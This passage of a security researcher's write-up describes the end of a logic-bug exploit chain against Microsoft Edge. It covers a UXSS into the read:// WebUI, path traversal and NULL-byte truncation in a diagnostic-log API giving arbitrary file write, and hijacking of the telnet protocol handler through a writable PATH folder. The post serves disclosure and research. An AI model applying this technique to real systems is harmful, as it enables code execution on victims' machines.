+However, as we continued exploring Microsoft Edge, we found that Edge had its own Reading Mode called [Immersive Reader](https://support.microsoft.com/en-us/education/learning-accelerators/use-immersive-reader-in-microsoft-edge-1). And unlike Chrome’s built-in Reading Mode, Immersive Reader seems to have been forked from Chromium early on, with Microsoft building on top of it. So instead of the old `chrome-distiller://` or the blacklisted `chrome-untrusted://`, Edge uses a custom `read://` scheme. And Microsoft seems to have forgotten to add this scheme to the blacklist as well, so our UXSS works on this privileged WebUI :)
+
+Starting from this privileged WebUI, we can access lots of native C++ objects through JavaScript. And one of them called `chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()` looked particularly interesting to me. We tried it out, and found that the function takes two parameters, a filename and a JSON string:
+
+*↓ We ran this on `read://https_orange.tw/?url=https://orange.tw`*
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles(  
+    'LOL.ZIP',   
+    '{  
+        "logFiles": {  
+            "ORANGE": "AAAAAAAA"  
+        },   
+        "deviceInfo": {1337: 1337}  
+    }'  
+)
+
+While playing with it, we observed that Microsoft Edge would first create a temporary folder and write `AAAAAAAA` to the file `ORANGE.json`. It would then pack the whole folder into `LOL.ZIP`, upload it to a Microsoft server, and clean everything up afterward. Of course, you’d want to try `../`… Yes, it does let you escape the temporary folder. But that `.json` extension is still a bit annoying. Maybe you’re also wondering if a NULL Byte could get rid of it… Of course it can! So now we have an arbitrary file write that can control both the filename and the content, and we can overwrite any file anywhere we want!
+
+Thank you again and again, Microsoft!
+
+![a_slide1_smooth](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/a_slide1_smooth.svg)
+
+Now, we’ve got almost all the pieces. The last step is figuring out how to turn a browser-level arbitrary file write into ACE to complete the chain. We observed that Microsoft Edge would do some interesting side-loading while initializing, such as reading a bunch of config files or loading DLLs from a writable folder.
+
+So the DLL side-loading sounds juicy. However, since our file write is wrapped in JSON, the content has to be a valid UTF-8 string. And because Microsoft Edge is a 64-bit process, we’d have to drop a 64-bit DLL, too. After spending some time working on this, we found that we couldn’t construct a valid 64-bit PE header that met the UTF-8 requirement in any case, so we gave up on DLL side-loading.
+
+We ended up solving this in a less obvious way. We found that besides OneAuth, Edge also loads a bunch of components while initializing, and one of them is “AutoLaunchProtocolsComponent”. The component would read a configuration file called `protocols.json` from a folder we can write to, and that file defines which origins are allowed to launch which URL protocol handlers. So by overwriting the file, we can launch any protocol handler from any origin.
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+11  
+12  
+13  
+14  
+15  
+16  
+17  
+18  
+19  
+20  
+21  
+22  
+23  
+24  
+25  
+26  
+{  
+  "allow": [  
+    {  
+      "origins": [  
+        "https://.get.microsoft.com",  
+        "https://.apps.microsoft.com"  
+      ],  
+      "protocol": "ms-windows-store"  
+    },  
+    {  
+      "origins": [  
+        "https://.onedrive.com",  
+        "https://.onedrive.live.com",  
+        "https://sharepoint.com"  
+      ],  
+      "protocol": "ms-word"  
+    },  
+    // [...]  
+  ],  
+  "warn": [  
+    // [...]  
+  ],  
+  "block": [  
+    // [...]  
+  ]  
+}
+
+As for how do we get Microsoft Edge to re-initialize? Just use our earlier browser-initiated navigation to jump to `edge://restart`! :)
+
+Here we chose `telnet://` to get code execution. On Windows, the telnet handler would try to invoke `telnet.exe`, but the binary isn’t shipped by default, so Windows goes looking for it in the directories listed in the PATH environment variable. And one of those directories just happens to be writable by us…
+
+1  
+2  
+3  
+4  
+5  
+6  
+C:\WINDOWS\system32  
+C:\WINDOWS  
+C:\WINDOWS\System32\Wbem  
+C:\WINDOWS\System32\WindowsPowerShell\v1.0  
+C:\WINDOWS\System32\OpenSSH  
+C:\Users\lowpriv\AppData\Local\Microsoft\WindowsApps    # <--- it's writable for `lowpriv`...
+
+So by simply dropping a modified `protocols.json` and a 32-bit tiny PE, we got ACE. The whole exploit is less than 100 lines of code. The restart isn’t really necessary in a real attack, only for Pwn2Own. Let’s check out the demo! 🔥
+
+From zero experience with modern browser exploitation to completing the full chain, the whole research took me two full months, with no LLMs/AI involved at all. But why, you might ask? Perhaps because it sounds cool, or maybe it was also just good timing — I only started using coding agents like Codex and Claude Code around March this year, and by then, I’d already found all the bugs and done the hard part ¯\_(ツ)_/¯
+
+So what’s the hard part? For memory corruption, it’s often the exploitation. But we’re playing with logic bugs, where the hard part is finding them, and once you find them all, chaining is the easiest part. So that’s also why I kept the whole exploit AI-free.
+
+Apart from that, I also see the UXSS primitive as a new attack surface, and agree that in the AI era, “[Attack Surface is the new 0day](https://x.com/steventseeley/status/2035096238178410582)“. I wanted to explore this gold mine more before sharing it with the AI giants. That’s another reason why I decided not to use AI on this chain.
+
+Of course, I’m not some old-fashioned guy who refuses to try new things, either. Outside of this chain, I’m also tokenmaxxing and addicted to AI. I believe once you’ve tasted how convenient LLMs are, no one would want to go back to hunting bugs by hand. That’s also the future, I think.
+
+I’m also not that afraid of being replaced by AI. I’d rather say it’s precisely because of AI, I finally have enough time to finish all the cool stuff that’s been sitting on my TODO list… like the [Windows RCE I just reported](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-58608), flipping the chain to [pop Microsoft Edge from `calc.exe`](https://youtu.be/Bh1zglq4mLE), or porting this logic-only full chain to Google Chrome (almost there ><). I’ll also show some progress at [CODE BLUE in Japan](https://codeblue.jp/en/program/time-table/day1-t1-08-origin-we-trust/) next month. Stay tuned! 😉
+
+So instead of worrying about how low the bar for vuln research can go, why not get excited about how high AI can take us? What fun can we have, what even cooler hacks can we build, and what impossible things can we make happen…?
